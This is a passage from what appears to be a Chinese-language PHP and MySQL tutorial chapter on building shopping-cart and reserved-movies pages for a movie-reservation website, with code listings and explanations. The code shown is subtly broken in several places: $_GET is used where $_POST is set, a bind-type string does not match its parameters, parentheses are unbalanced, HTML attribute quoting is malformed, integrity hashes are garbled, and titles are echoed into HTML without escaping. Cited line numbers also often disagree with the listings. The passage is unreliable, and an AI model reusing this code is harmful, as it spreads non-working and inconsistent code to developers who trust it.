20. <h1>Shopping Cart</h1>
21. <?php
22. require_once('dbconnection.php');
23. require_once('movielistingfileconstants.php');
24. 
25. // Only display this page if the user is logged in
26. if (!isset($_SESSION['user_id'])) :
27. 
28. header("Location: " . dirname($_SERVER['PHP_SELF']));
29. exit;
30.
31.     elseif (isset($_POST['id_to_delete'])):
32.
33.     // ...
34.
35.     elseif (isset($_POST['reserve_movies'])):
36.
37.
38.     // ...
39.
40.     elseif (isset($_SESSION['cart']) && count($_SESSION['cart']) > 0):
41.
42.
43.     // ...
44.
45.     else:
46.     ?>
47.     <hr/>
48.     <h3>No Movies in your cart :-(</h3>
49.     <?php
50.     endif;
51.     ?>
52.     </div>
53. </div>
54. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
55.     integrity="sha384-Q8i/LTVZQMX7LZ8W3wqks2XoK/VYV+Nn6..."
56.     crossorigin="anonymous"></script>
57. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
58.     integrity="sha384-wHAiF1R..."
59.     crossorigin="anonymous"></script>
60. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
61.     integrity="sha384-B0Uglyr+..."
62.     crossorigin="anonymous"></script>
63. </body>
64. </html>
```

同样，这是一个样板脚本，您应该熟悉。第 3、4 和 8 行设置并显示页面标题。第 16 行包含并显示导航栏。第 20 行在 <h1> 元素集中显示“购物车”。第 22-23 行包含 dbconnection.php、movielistingfileconstants.php。

第 26 行 (if (!isset($_SESSION['user_id'])):) 是检查用户是否未登录的条件。如果用户未登录，第 26 行会将他们重定向到主页。

第 31 行 (elseif (isset($_POST['id_to_delete'])):) 是用户在购物车中选择要删除的电影的条件。在此条件下，我们将所选电影从购物车和预订表中删除。



## 25. 添加预订功能

第 35 行 (`elseif (isset($_POST['reserve_movies'])):`) 是检查用户是否预订了购物车中电影的条件。此条件用于删除购物车并将用户重定向回主页。

第 39 行 (`elseif (isset($_SESSION['cart']) && count($_SESSION['cart']) > 0):`) 是检查用户购物车中是否有电影的条件。此条件用于显示用户购物车中的电影列表，并可删除每部电影。还将显示一个带有预订购物车中电影按钮的表单。

第 43 行 (`else:`) 是一个“兜底”条件，表示用户购物车中没有电影，因此第 43 行将显示购物车中没有电影。

其余代码是标准的 Bootstrap 样板脚本包含。

### 为预订电影添加表单

让我们将以下购物车代码和用于预订电影的表单添加到条件 (`elseif (isset($_SESSION['cart']) && count($_SESSION['cart']) > 0):`) 中。我将在下面的清单 25.38 中解释代码。

### 清单 25.38

```php
1. elseif (isset($_SESSION['cart']) && count($_SESSION['cart']) > 0):
2.
3.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
4.         or trigger_error(
5.             'Error connecting to MySQL server for ' . DB_NAME,
6.             E_USER_ERROR
7.         );
8.
9.     $user_id = $_SESSION['user_id'];
10.
11.     $query = "SELECT movielisting.id, movielisting.title, movielisting.image_file
12.               FROM movielisting
13.               INNER JOIN reservation ON movielisting.id = reservation.movielisting_id
14.               WHERE reservation.user_id = ?";
15.
16.     $result = parameterizedQuery($dbc, $query, 'i', $user_id);
17.
18.     if (mysqli_errno($dbc))
19.     {
20.         trigger_error('Error querying database movielisting', E_USER_ERROR);
21.     }
22.
23.     if (mysqli_num_rows($result) > 0):
24. ?>
```

### 添加购物车脚本

```html
<table class="table table-striped table-hover">
    <thead>
        <tr>
            <th scope="col"><h4>Movies to Reserve</h4></th>
            <th scope="col"></th>
            <th scope="col"></th>
        </tr>
    </thead>
    <tbody>
    <?php

    while ($row = mysqli_fetch_assoc($result))
    {
        // Only display what's in the shopping cart
        if (array_search($row['id'], $_SESSION['cart']) !== false)
        {
            $movie_image_file = $row['image_file'];

            if (empty($movie_image_file))
            {
                $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
            }

            $movie_title_row = "<tr><td><img src=\"" . $movie_image_file . "\" class='img-thumbnail'"
                . "style='max-height: 75px;' alt='Movie image'></td>"
                . "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id='"
                . $row['id'] . "'>" . $row['title'] . "</a></td>"
                . "<td class='align-middle'><form method='POST' action='"
                . $_SERVER['PHP_SELF'] . "'><button class='btn btn-danger' type='submit' "
                . "name='id_to_delete' value='" . $row['id'] . "'>"
                . "<i class='far fa-trash-alt'></i></button></form></td>";

            $movie_title_row .= "</tr>";

            echo $movie_title_row;
        }
    }
    ?>
    </tbody>
</table>
<form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
    <button class="btn btn-success" type="submit" name="reserve_movies">Reserve Movies</button>
</form>
<?php
else:
?>
<h3>No Movies in your cart :-(</h3>
<?php
endif;
else:
```

## 25. 添加预订功能

在第 3 行连接到 movielisting 数据库后，我们在第 11–14 行创建了 movielisting 和 reservation 表的 INNER JOIN 查询，该查询返回用户已预订的每部电影的 id、title 和 image_file。

假设查询至少返回一部电影（第 23 行），第 25–65 行显示包含用户购物车中所有电影的表格。由于查询返回 reservation 表中的所有电影，因此我们需要只保留购物车中的电影。这一区别很重要，因为用户可能已经预订了电影，我们会在其他地方显示这些电影。

让我们更仔细地查看第 36–62 行。第 36 行遍历用户的每个预订。然而，第 39 行 (`if (array_search($row['id'], $_SESSION['cart']) !== false)`) 仅允许显示同时包含在用户购物车中的预订行，这些行由第 41–60 行处理。

在第 48–51 行，我们显示电影的图像和标题，该标题链接回 `moviedetails.php` 脚本，并将电影 ID 作为查询参数：

```php
$movie_title_row = "<tr><td><img src=" . $movie_image_file . " class='img-thumbnail'"
    . "style='max-height: 75px;' alt='Movie image'></td>"
    . "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id='"
    . $row['id'] . "'>" . $row['title'] . "</a></td>";
```

注意第 53 行，添加到 `$movie_title_row` 的表单中的删除按钮链接回此页面，并将 `id_to_delete` 的值设置为电影 ID：

```php
$movie_title_row .= "<td class='align-middle'><form method='POST' action="
    . $_SERVER['PHP_SELF'] . "><button class='btn btn-danger' type='submit' "
    . "name='id_to_delete' value=" . $row['id'] . ">"
    . "<i class='far fa-trash-alt'></i></button></form></td>";
```

此外，请注意，我使用的是 Font Awesome 的垃圾桶图标，背景为红色，如图 25.25 所示。

第 66–68 行显示一个表单，其中包含一个“Reserve Movies”按钮，其 `name` 属性设置为 `reserve_movies`。

第 70 行是查询未返回任何预订的条件，因此第 72 行显示购物车中没有电影。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_446_0.png)

### 从购物车中移除电影

如果用户改变主意不想保留某部电影，我们需要将其从购物车和预订表中移除。将清单 25.39 中的代码添加到条件 (`elseif (isset($_POST['id_to_delete'])):`) 中。我随后会解释代码。

### 清单 25.39

```php
1. elseif (isset($_POST['id_to_delete'])):
2.
3. $movie_to_delete = $_POST['id_to_delete'];
4.
5. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
6.     or trigger_error(
7.         'Error connecting to MySQL server for ' . DB_NAME,
8.         E_USER_ERROR
9.     );
10.
11. $user_id = $_SESSION['user_id'];
12.
13. $query = "DELETE FROM reservation
14.         WHERE user_id = ? AND movielisting_id = ?";
15. $result = parameterizedQuery($dbc, $query, 'ii', $user_id, $movie_to_delete);
16.
17. if (mysqli_errno($dbc))
18. {
19.     trigger_error('Error querying database movielisting', E_USER_ERROR);
20. }
21.
22. $query = "UPDATE movielisting SET number_reserved = number_reserved - 1
23.         WHERE id = ?";
24. $result = parameterizedQuery($dbc, $query, 'i', $movie_to_delete);
25.
26. if (mysqli_errno($dbc))
27. {
28.     trigger_error('Error querying database movielisting', E_USER_ERROR);
29. }
30.
31. if (($key = array_search($movie_to_delete, $_SESSION['cart'])) !== false)
32. {
33.     unset($_SESSION['cart'][$key]);
34. }
35.
36. header("Location: " . $_SERVER['PHP_SELF']);
37. exit;
38.
39. elseif (isset($_POST['reserve_movies'])):
```

## 25. 添加预订功能

在第 5 行连接到 movielisting 数据库后，我们在第 13–14 行创建删除该电影预订的查询，并在第 15 行执行该查询。

在第 22 行，我们创建了一个查询来减少该标题的预订电影数量，并在第 24 行执行该查询。

在第 31 行，我们搜索要删除的电影 ID 关联的键，并在第 33 行将其从用户购物车中移除。

最后，第 36 行将浏览器重定向到此购物车页面。页面加载时，更新后的购物车内容将在表格中刷新。

### 为购物车中的电影添加预订代码

当用户预订购物车中的电影时，执行将恢复到 (`elseif (isset($_POST['reserve_movies'])):`) 条件。由于我们已经将他们的电影添加到预订表中，这里我们删除购物车会话变量， effectively 清空它，并将用户重定向回主页。

将清单 25.40 中的代码添加到此条件。

### 清单 25.40

```php
1. elseif (isset($_POST['reserve_movies'])):
2.
3.   // Delete the shopping cart (it's already in the reservation table),
4.   // and route back to the Home page
5.   unset($_SESSION['cart']);
6.
7.   header("Location: " . dirname($_SERVER['PHP_SELF']));
8.   exit;
9.
10. elseif (isset($_SESSION['cart']) && count($_SESSION['cart']) > 0):
```




## 完整代码清单

清单 25.41 是 shoppingcart.php 页面的完整代码。

### 清单 25.41.

```php
<!DOCTYPE html>
<?php
  require_once('pagetitles.php');
  $page_title = MR_SHOPPING_CART_MOVIE_PAGE;
?>
<html>
  <head>
    <title><?php echo $page_title ?></title>
    <link rel="stylesheet"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
          integrity="sha384-GJzZqFQb1Qb1QTN6wyS9FFf1BuGjlPaSe9KKyP0DgiMD4lMj70zQZKYbI7O6tWs"
          crossorigin="anonymous">
</head>
<body>
<?php
  require_once('navmenu.php');
?>
  <div class="card">
    <div class="card-body">
      <h1>Shopping Cart</h1>
<?php
  require_once('dbconnection.php');
  require_once('movielistingfileconstants.php');

  // Only display this page if the user is logged in
  if (!isset($_SESSION['user_id'])):

    header("Location: " . dirname($_SERVER['PHP_SELF']));
    exit;
  elseif (isset($_POST['id_to_delete'])):

    $movie_to_delete = $_POST['id_to_delete'];

    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
      or trigger_error(
        'Error connecting to MySQL server for ' . DB_NAME,
        E_USER_ERROR
      );

    $user_id = $_SESSION['user_id'];

    $query = "DELETE FROM reservation WHERE user_id = ? AND movielisting_id = ?";
    $result = parameterizedQuery($dbc, $query, 'ii', $user_id, $movie_to_delete);

if (mysqli_errno($dbc))
{
    trigger_error('Error querying database movielisting', E_USER_ERROR);
}

$query = "UPDATE movielisting SET number_reserved = number_reserved - 1 WHERE id = ?";
$result = parameterizedQuery($dbc, $query, 'i', $movie_to_delete);

if (mysqli_errno($dbc))
{
    trigger_error('Error querying database movielisting', E_USER_ERROR);
}

if (($key = array_search($movie_to_delete, $_SESSION['cart'])) !== false)
{
    unset($_SESSION['cart'][$key]);
}

header("Location: " . $_SERVER['PHP_SELF']);
exit;

elseif (isset($_POST['reserve_movies'])):
    // Delete the shopping cart (it's already in the reservation table),
    // and route back to the Home page
    unset($_SESSION['cart']);

header("Location: " . dirname($_SERVER['PHP_SELF']));
exit;

elseif (isset($_SESSION['cart']) && count($_SESSION['cart']) > 0):
    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for ' . DB_NAME,
            E_USER_ERROR
        );

    $user_id = $_SESSION['user_id'];

    $query = "SELECT movielisting.id, movielisting.title, movielisting.image_file
        FROM movielisting
            INNER JOIN reservation ON movielisting.id = reservation.movielisting_id
        WHERE reservation.user_id = ?";
    $result = parameterizedQuery($dbc, $query, 'i', $user_id);

if (mysqli_errno($dbc))
{
    trigger_error('Error querying database movielisting', E_USER_ERROR);
}

if (mysqli_num_rows($result) > 0):
?>
<table class="table table-striped table-hover">
    <thead>
        <tr>
            <th scope="col"><h4>Movies to Reserve</h4></th>
            <th scope="col"></th>
            <th scope="col"></th>
        </tr>
    </thead>
    <tbody>
    <?php

        while ($row = mysqli_fetch_assoc($result))
        {
            // Only display what's in the shopping cart
            if (array_search($row['id'], $_SESSION['cart']) !== false)
            {
                $movie_image_file = $row['image_file'];

                if (empty($movie_image_file))
                {
                    $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
                }

                $movie_title_row = "<tr><td><img src=\"" . $movie_image_file . "\" class='img-thumbnail'"
                    . "style='max-height: 75px;' alt='Movie image'></td>"
                    . "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id="
                    . $row['id'] . "'>" . $row['title'] . "</a></td>";

                $movie_title_row .= "<td class='align-middle'><form method='POST' action='"
                    . $_SERVER['PHP_SELF'] . "'> <button class='btn btn-danger' type='submit' "
                    . "name='id_to_delete' value='" . $row['id'] . "'>"
                    . "<i class='far fa-trash-alt'></i></button></form></td>";

                $movie_title_row .= "</tr>";

                echo $movie_title_row;
            }
        }
    ?>
    </tbody>
</table>
<form method="POST" action="<?=$_SERVER['PHP_SELF']?>">
    <button class="btn btn-success" type="submit" name="reserve_movies">Reserve Movies</button>
</form>
<?php
else:
?>
```

### 清单 25.42.

```php
<?php
/**
 * Purpose: Finds the number of movies reserved by current user not in cart
 *
 * Description: Based on the $_SESSION['user_id'] and the $_SESSION['cart']
 *              movie ids, query for the movies reserved by the user and compare
 *              to the movies in the cart. The number of movies reserved not in
 *              the cart are returned. NOTE, if $_SESSION['user_id'] is not set,
 *              0 is returned and if $_SESSION['cart'] is not set, the number
 *              of reservations for the user is returned (assuming
 *              $_SESSION['user_id'] is set).
 *
 * @return int The number of movies reserved by the user not in the cart,
 *             or 0 if $_SESSION['user_id'] is not set.
 */
function numberOfMoviesReservedNotInCart()
{
    $number_of_movies_reserved = 0;
    $number_of_movies_reserved_in_cart = 0;

    if (session_status() == PHP_SESSION_NONE)
    {
        session_start();
    }

    if (!isset($_SESSION['user_id']))
    {
        return 0;
    }

    require_once('dbconnection.php');

    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for ' . DB_NAME,
            E_USER_ERROR
        );

    $user_id = $_SESSION['user_id'];

    $query = "SELECT movieListing_id FROM reservation WHERE user_id = ?";
    $result = parameterizedQuery($dbc, $query, 'i', $user_id)
        or trigger_error('Error querying database movieListing',
            E_USER_ERROR);

    $number_of_movies_reserved = mysqli_num_rows($result);

    if (!isset($_SESSION['cart']))
    {
        return $number_of_movies_reserved;
    }

    $movies_in_cart = $_SESSION['cart'];

    while ($row = mysqli_fetch_assoc($result))
    {
        // Accumulate count of reserved movies in cart
        if (array_search($row['movieListing_id'], $movies_in_cart) !== false)
        {
            $number_of_movies_reserved_in_cart++;
        }
    }

    return $number_of_movies_reserved - $number_of_movies_reserved_in_cart;
}
```

该函数查询 Movie 数据库的 reservation 表，获取所有包含给定 user_id 的行。在第 46 行，我们得到匹配行的总数。第 55–62 行累积了用户购物车中与用户在 reservation 表中已有的电影不匹配的电影数量。返回该数量。

现在打开 pagetitles.php，在 MR_SHOPPING_CART_MOVIE_PAGE 定义之后添加以下 MR_RESERVED_MOVIES_PAGE 定义：

```text
Unchanged Lines
    <?php
    // Page Titles
    define('MR_HOME_PAGE', 'Movie Reservations');
    ...
    define('MR_SHOPPING_CART_MOVIE_PAGE', 'Movie Reservations - Shopping Cart');
+ Added Line
+     define('MR_RESERVED_MOVIES_PAGE', 'Movie Reservations - Reserved Movies');
```

接下来，打开 navmenu.php 脚本。在 <a class="nav-item nav-link"> $page_title == MR_SHOPPING_CART_MOVIE_PAGE ...</a> 元素之前，并在 <div class="nav navbar-nav ml-auto"> 之后，添加清单 25.43 中的代码。




### 列表 25.43.
```
1. Unchanged Lines
2.     <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
3.         <div class="nav navbar-nav ml-auto">
4. + Added Line
5. +     <?php if (numberOfMoviesReservedNotInCart() > 0): ?>
6. +         <a class="nav-item nav-link<?= $page_title == MR_RESERVED_MOVIES_PAGE ? ' active' : '' ?>"
7. +             href='reservedmovies.php'><i class="fas fa-video"></i></a>
8. +     <?php endif; ?>
9. Unchanged Lines
10.     <a class="nav-item nav-link<?= $page_title == MR_SHOPPING_CART_MOVIE_PAGE ? ' active' : '' ?>"
11.         href='shoppingcart.php'><i class='fas fa-shopping-cart'></i> <span class="badge badge-light">
12.         <?= isset($_SESSION['cart']) ? count($_SESSION['cart']) : '' ?></span></a>
13.     </div>
14. </div>
```

第一个条件（`<?php if (numberOfMoviesReservedNotInCart() > 0): ?>`），只有在用户做出的预订当前不在其购物车中时，才允许此条件内的代码执行。

（`<a class="nav-item nav-link<?= $page_title == MR_RESERVED_MOVIES_PAGE ...</a>`）是标准的三元操作，根据是否正在显示 reservedmovies.php 脚本来显示投影仪图标链接是否处于活动状态。

> 投影仪图标是可免费使用的 Font Awesome “fa-video” 图标。

## 显示和退回预订的电影
当用户点击投影仪图标时，其浏览器会将其带到 reservedmovies.php 页面（我们在此创建）。我们希望此页面显示电影列表、电影详情的链接、每部电影的退回按钮以及退回所有电影的表单按钮。见图 25.27。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_455_0.png)

这样，电影可以逐个退回，使用单个电影的退回按钮，如图 25.28 所示，也可以按表单上的 **退回电影** 按钮一次性全部退回，如图 25.29 所示

## 25. 添加预订功能

## 创建预订电影页面的样板和逻辑

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_456_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_456_1.png)

预订电影页面是一个标准的 Bootstrap 页面。创建一个名为 `reservedmovies.php` 的新脚本，并使用列表 25.44 中显示的代码。

### 列表 25.44.
```
<!DOCTYPE html>
<?php
require_once('pagetitles.php');
$page_title = MR_RESERVED_MOVIES_PAGE;
?>
<html>
<head>
<title><?= $page_title ?></title>
<link rel="stylesheet"
    href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
    integrity="sha384-GJzZqFGwbIQTTN6wy59FF1BuGJpLSa9dkKm0p0DgiMDn4iYMj70zQWKYbi7O6EWS"
    crossorigin="anonymous">
</head>
<body>
<?php
require_once('navmenu.php');
?>
<div class="card">
<div class="card-body">
<h1>Reserved Movies</h1>
<?php
require_once('dbconnection.php');
require_once('movielistingfileconstants.php');

// Only display this page if the user is logged in
if (!isset($_SESSION['user_id'])) :

    header("Location: " . dirname($_SERVER['PHP_SELF']));
    exit;

elseif (isset($_POST['id_to_check_in'])):

    // ...
```

## 显示和退回预订的电影
```
35.     elseif (isset($_POST['check_in_movies'])):
36.
37.     // ...
38.
39.     else:
40.
41.     // ...
42.
43.     endif;
44.     ?>
45.     </div>
46.     </div>
47.     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
48.         integrity="sha384-q8i/X+965DzO0rT7akK1JStQIAqAqVqVzpbo5snXKpYwYfRvHv+8abtTE1Pi6jizo"
49.         crossorigin="anonymous"></script>
50.     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
51.         integrity="sha384-WAiFfRlMFY6iSSRxvfOClfBU9yXhdJ/yoi7FRNXMRBuSWkHZyUihA6ZObIgu"
52.         crossorigin="anonymous"></script>
53.     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
54.         integrity="sha384-B0UglyrJ+..."
55.         crossorigin="anonymous"></script>
56.     </body>
57. </html>
```

同样，这是一个样板脚本，应该看起来很熟悉。第 3、4 和 8 行设置并显示页面标题。第 16 行包含并显示导航栏。第 20 行在 <h1> 元素中显示“Reserved Movies”。第 22-23 行包含 dbconnection.php、movielistingfileconstants.php、queryutils.php。

第 26 行（if (!isset($_SESSION['user_id'])):）是检查用户是否未登录的条件。如果用户未登录，第 28 行会将用户重定向回主页。

第 31 行（elseif (isset($_POST['id_to_check_in'])):）是用户在预订电影列表中选择要退回的电影的条件。此条件是我们从预订表中删除所选电影并更新该电影预订副本数量的位置。

第 35 行（elseif (isset($_POST['check_in_movies'])):）是检查用户是否选择了 Return Movies 以退回其预订的所有电影的条件。此条件是我们更新所有正在退回电影的副本数量并从预订表中删除用户的所有电影预订，然后将他们重定向回主页的位置。

## 25. 添加预订功能
第 39 行（else:）是一个“兜底”条件。此条件显示用户预订的电影列表以及退回每部电影的按钮。我们还显示一个表单，其中包含退回所有预订电影的按钮。

其余代码是标准的 Bootstrap 样板脚本包含。

## 列出预订的电影
让我们将列表 25.45 中的代码添加到兜底条件（else:）中，用于列出用户预订的所有电影以及退回电影的表单。我将在下面解释代码：

### 列表 25.45.
```
```php
else:

    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for' . DB_NAME,
            E_USER_ERROR
        );

    $user_id = $_SESSION['user_id'];

    $query = "SELECT movielisting.id, movielisting.title, movielisting.image_file
        FROM movielisting
        INNER JOIN reservation ON movielisting.id = reservation.movielisting_id
        WHERE reservation.user_id = ?";

    $result = parameterizedQuery($dbc, $query, 'i', $user_id)
        or trigger_error(
            'Error querying database tables movieListing and reservation',
            E_USER_ERROR);

    if (mysqli_num_rows($result) > 0):
?>
<table class="table table-striped table-hover">
    <thead>
        <tr>
            <th scope="col"><h4>Movies You Have Reserved</h4></th>
            <th scope="col"></th>
            <th scope="col"></th>
        </tr>
    </thead>
    <tbody>
```

## 显示和退回预订的电影
```
```php
while ($row = mysqli_fetch_assoc($result))
{
    // Only display what's NOT in the shopping cart
    if (empty($_SESSION['cart']))
    || array_search($row['id'], $_SESSION['cart']) === false)
    {
        $movie_image_file = $row['image_file'];
        if (empty($movie_image_file))
        {
            $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
        }
        $movie_title_row = "<tr><td><img src='" . $movie_image_file
            . "' class='img-thumbnail' style='max-height: 75px;'>"
            . " alt='Movie image'></td>"
            . "<td class='align-middle'><a class='nav-link' "
            . " href='moviedetails.php?id="
            . $row['id'] . "'>" . $row['title'] . "</a></td>";
        $movie_title_row .= "<td class='align-middle'><form method='POST' "
            . "action='" . $_SERVER['PHP_SELF'] . "'>"
            . "<button class='btn btn-success' type='submit' "
            . "name='id_to_check_in' value='" . $row['id'] . "'>"
            . "<i class='fas fa-check-circle'></i></button></form></td>";
        $movie_title_row .= "</tr>";
        echo $movie_title_row;
    }
}
?>

</tbody>
</table>

<form method="POST" action="<?= $_SERVER['PHP_SELF'] ?>">
<button class="btn btn-success" type="submit"
name="check_in_movies">Return Movies</button>
</form>

<?php
else:
?>
<h3>No Movies Reserved :-</h3>
<?php
endif;
```

## 25. 添加预订功能

连接到第 3 行的 movieListing 数据库后，与我们对购物车的处理相同，我们在第 11–14 行创建了 movieListing 和 reservation 表的 INNER JOIN 查询，该查询返回用户预订的所有电影，包含每部电影的 id、title 和 image_file。

假设查询至少返回一部电影（第 21 行），第 23–66 行显示一个包含用户预订的所有电影的表格（不包括用户购物车中当前拥有的电影）。

让我们更仔细地查看第 33–63 行。第 33 行遍历用户的每个预订。然而，第 36–37 行仅允许显示不在用户购物车中的预订行，由第 39–61 行处理。

在第 46 行，我们显示电影的图像和标题，该标题链接回 moviedetails.php 脚本，并将电影 ID 作为查询参数：

```
$movie_title_row = "<tr><td><img src=" . $movie_image_file
    . " class='img-thumbnail' style='max-height: 75px;'"
    . " alt='Movie image'></td>"
    . "<td class='align-middle'><a class='nav-link' "
    . " href='moviedetails.php?id='"
    . $row['id'] . "">" . $row['title'] . "</a></td>";
```

注意在第 53 行，添加到 $movie_title_row 的表单中的已检查圆圈按钮，该按钮链接回此页面，并将 id_to_check 的值设置为电影 ID：

```
$movie_title_row .= "<td class='align-middle'><form method='POST' "
    . "action=" . $_SERVER['PHP_SELF'] . ">"
    . "<button class='btn btn-success' type='submit' "
    . "name='id_to_check_in' value=" . $row['id'] . ">"
    . "<i class='fas fa-check-circle'></i></button></form></td>";
```

请注意，我使用的是带有绿色背景的 Font Awesome 已检查圆圈图标。参见图 25.30。

第 67–70 行显示一个表单，其中包含“Return Movies”按钮，其 name 属性设置为 check_in_movies。

第 72 行是查询未返回任何预订的条件，因此第 74 行显示没有预订的电影。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_460_0.png)

### 添加用于归还电影并从预订表中删除的代码

当用户选择要归还的电影时，我们需要从预订表中删除该电影。将清单 25.46 中的代码添加到条件 (elseif (isset($_POST['id_to_check_in']))); 中。

### 清单 25.46.

```php
1. elseif (isset($_POST['id_to_check_in'])):
2. 
3. $movie_to_check_in = $_GET['id_to_check_in'];
4. 
5. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
6.     or trigger_error(
7.         'Error connecting to MySQL server for' . DB_NAME,
8.         E_USER_ERROR
9.     );
10. 
11. $user_id = $_SESSION['user_id'];
12. 
13. $query = "DELETE FROM reservation WHERE user_id = ? AND movieListing_id = ?";
14. 
15. parameterizedQuery($dbc, $query, 'ii', $user_id, $movie_to_check_in);
16. 
17. if (mysqli_errno($dbc))
18. {
19.     trigger_error('Error querying database movieListing', E_USER_ERROR);
20. }
21. 
22. $query = "UPDATE movieListing SET number_reserved = number_reserved - 1
23.           WHERE id = ?";
24. 
25. parameterizedQuery($dbc, $query, 'i', $movie_to_check_in);
26. 
27. if (mysqli_errno($dbc))
28. {
29.     trigger_error('Error querying database movieListing', E_USER_ERROR);
30. }
31. 
32. header("Location: " . $_SERVER['PHP_SELF']);
33. exit;
34. 
35. elseif (isset($_POST['check_in_movies'])):
```

连接到第 5 行的 movieListing 数据库后，我们在第 13 行创建了一个用于删除此电影预订的查询，并在第 15 行执行该查询。

## 25. 添加预订功能

在第 22-23 行，我们创建了一个查询来减少该标题的预订电影数量，并在第 25 行执行该查询。

最后，第 32 行重定向到此购物车页面，因此更新后的购物车内容将在表格中显示。

### 添加用于归还所有电影的代码

当用户归还电影时，执行将继续在 (elseif (isset($_POST['check_in_movies'])); ) 条件中。此子句是我们更新每部电影预订副本数量、从预订表中删除用户预订的所有电影并将用户重定向到主页的位置。

将清单 25.47 中的代码添加到此条件中。

### 清单 25.47.

```php
1. elseif (isset($_POST['check_in_movies'])):
2.
3. // Remove all reservations and update number of reserved copies
4. // in movieListing for returned movies
5. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
6.     or trigger_error(
7.         'Error connecting to MySQL server for ' . DB_NAME,
8.         E_USER_ERROR
9.     );
10.
11. $user_id = $_SESSION['user_id'];
12.
13. $query = "SELECT movieListing_id FROM reservation WHERE user_id = ?";
14.
15. $result = parameterizedQuery($dbc, $query, 'i', $user_id)
16.     or trigger_error('Error querying database table reservation', E_USER_ERROR);
17.
18. // Decrement number of reserved in movieListing
19. while ($row = mysqli_fetch_assoc($result))
20. {
21.     $movie_to_check_in = $row['movieListing_id'];
22.
23.     $query = "UPDATE movieListing
24.         SET number_reserved = number_reserved - 1 WHERE id = ?";
25.
26.     parameterizedQuery($dbc, $query, 'i', $movie_to_check_in);
27.
28.    if (mysqli_errno($dbc))
29.    {
30.        trigger_error('Error querying database table movieListing', E_USER_ERROR);
31.    }
32. }
33.
34. // Delete all reservations for this user
35. $query = "DELETE FROM reservation WHERE user_id = ?";
36.
37. parameterizedQuery($dbc, $query, 'i', $user_id);
38.
39. if (mysqli_errno($dbc))
40. {
41.    trigger_error('Error querying database table reservation', E_USER_ERROR);
42. }
43.
44. header("Location: " . dirname($_SERVER['PHP_SELF']));
45. exit;
46.
47. else:
```

连接到第 5 行的 movieListing 数据库后，我们在第 13 行为此用户创建所有预订的查询，并在第 15 行执行该查询。

第 19–32 行遍历预订中的 ID，并将每部电影的预订副本数量减少 1。

第 35 行是用于删除此用户所有预订的查询，并在第 37 行执行。

最后，第 44 行将用户重定向到主页。

## 25. 添加预订功能

### 完整代码清单

清单 25.48 是 reservedmovies.php 页面的完整清单。

### 清单 25.48.

```php
<!DOCTYPE html>
<?php
  require_once('pagetitles.php');
  $page_title = MR_RESERVED_MOVIES_PAGE;
?>
<html>
<head>
  <title><?= $page_title ?></title>
  <link rel="stylesheet"
    href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
    integrity="sha384-GJzZqFGwb1QTTN6wy59FfF1BuCjPlSa9c0kK0p0Dg1M4i1Yj7OgZkYbI706tUS"
    crossorigin="anonymous">
</head>
<body>
<?php
  require_once('navmenu.php');
?>
<div class="card">
  <div class="card-body">
    <h1>Reserved Movies</h1>
<?php
  require_once('dbconnection.php');
  require_once('movielistingfileconstants.php');
  require_once('queryutils.php');

  // Only display this page if the user is logged in
  if (!isset($_SESSION['user_id'])) :

    header("Location: " . dirname($_SERVER['PHP_SELF']));
    exit;

  elseif (isset($_POST['id_to_check_in'])):

    $movie_to_check_in = $_POST['id_to_check_in'];

  $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
    or trigger_error(
      'Error connecting to MySQL server for ' . DB_NAME, E_USER_ERROR
    );

  $user_id = $_SESSION['user_id'];

$query = "DELETE FROM reservation WHERE user_id = ? AND movielisting_id = ?";

parameterizedQuery($dbc, $query, 'i', $user_id, $movie_to_check_in);

if (mysqli_errno($dbc))
{
    trigger_error('Error querying database movielisting', E_USER_ERROR);
}

$query = "UPDATE movielisting SET number_reserved = number_reserved - 1 WHERE id = ?";

parameterizedQuery($dbc, $query, 'i', $movie_to_check_in);

if (mysqli_errno($dbc))
{
    trigger_error('Error querying database movielisting', E_USER_ERROR);
}

header("Location: " . $_SERVER['PHP_SELF']);
exit;

elseif (isset($_POST['check_in_movies'])):

// Remove all reservations and update number of reserved copies
// in movielisting for returned movies
$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
    or trigger_error(
